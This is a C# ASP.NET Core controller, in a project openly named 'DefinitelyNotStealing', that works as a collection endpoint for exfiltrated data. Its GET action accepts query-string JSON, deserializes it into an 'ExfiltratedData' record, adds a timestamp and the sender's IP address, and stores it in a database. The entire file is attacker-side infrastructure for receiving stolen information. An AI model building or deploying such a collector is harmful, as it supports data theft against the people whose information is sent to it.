using System;
using System.Threading.Tasks;
using DefinitelyNotStealing.Data;
using DefinitelyNotStealing.Models.Entities;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Newtonsoft.Json;

namespace DefinitelyNotStealing.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class GimmeController : ControllerBase
    {
        private readonly AppDataContext _ctx;
        private readonly IHttpContextAccessor _httpContextAccessor;

        public GimmeController(AppDataContext context, IHttpContextAccessor httpContextAccessor)
        {
            _ctx = context;
            _httpContextAccessor = httpContextAccessor;
        }

        [HttpGet]
        public async Task Get(string stringData)
        {
            if (!string.IsNullOrEmpty(stringData))
            {
                var data = JsonConvert.DeserializeObject<ExfiltratedData>(stringData);
                data.ID = 0;
                data.Timestamp = DateTime.UtcNow;
                data.ClientIP = _httpContextAccessor.HttpContext.Connection.RemoteIpAddress.ToString();
                await _ctx.AddAsync(data);
                await _ctx.SaveChangesAsync();
            }
        }
    }
}